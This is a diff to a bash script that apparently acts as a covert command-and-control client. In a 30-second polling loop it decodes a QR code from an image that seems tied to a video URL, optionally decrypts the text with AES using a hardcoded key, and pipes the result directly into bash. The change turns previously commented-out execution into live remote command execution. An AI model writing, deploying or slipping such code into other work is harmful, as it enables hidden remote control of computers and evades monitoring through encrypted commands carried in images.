@@ -21,17 +21,23 @@ do
         exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)
 
         key_hex="4326462948404d635166546a576e5a72" #Please change, this is just used for the example!
-
+        
         encrypted_data=$exec
+        if [[ $(echo "$encrypted_data" | cut -c1-3) == "~1~" ]]; 
+        then
+            encrypted_data="${encrypted_data:3}"
+            decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)
 
-        decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)
+            decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')
 
-        decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')
+            echo "Decrypted data: $decrypted_data"
+            echo $decrypted_data | bash
+        else
+            encrypted_data="${encrypted_data:3}"
+            echo "Data: $encrypted_data"
+            echo $encrypted_data | bash
+        fi
 
-        echo "Decrypted data: $decrypted_data"
-
-        #echo $exec
-        #echo $exec | bash
         video_save=$newest_video_url
     fi
     sleep 30
